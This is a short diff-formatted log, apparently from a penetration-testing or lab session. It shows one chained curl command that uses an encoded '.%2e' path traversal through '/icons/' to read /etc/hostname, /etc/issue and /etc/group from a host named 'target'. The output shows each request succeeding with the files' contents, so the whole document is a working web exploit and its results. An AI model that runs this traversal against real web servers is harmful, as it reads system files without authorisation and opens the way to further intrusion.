@@ -1,0 +1,18 @@
+$ echo === /etc/hostname === && curl -sS --path-as-is 'http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/hostname' -o /tmp/etc_hostname.txt -w 'http=%{http_code}\n' && head -3 /tmp/etc_hostname.txt && echo === /etc/issue === && curl -sS --path-as-is 'http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/issue' -o /tmp/etc_issue.txt -w 'http=%{http_code}\n' && head -3 /tmp/etc_issue.txt && echo === /etc/group === && curl -sS --path-as-is 'http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/group' -o /tmp/etc_group.txt -w 'http=%{http_code}\n' && head -3 /tmp/etc_group.txt
+exit_code: 0
+--- stdout ---
+=== /etc/hostname ===
+http=200
+target
+=== /etc/issue ===
+http=200
+Debian GNU/Linux 10 \n \l
+
+=== /etc/group ===
+http=200
+root:x:0:
+daemon:x:1:
+bin:x:2:
+
+--- stderr ---
+
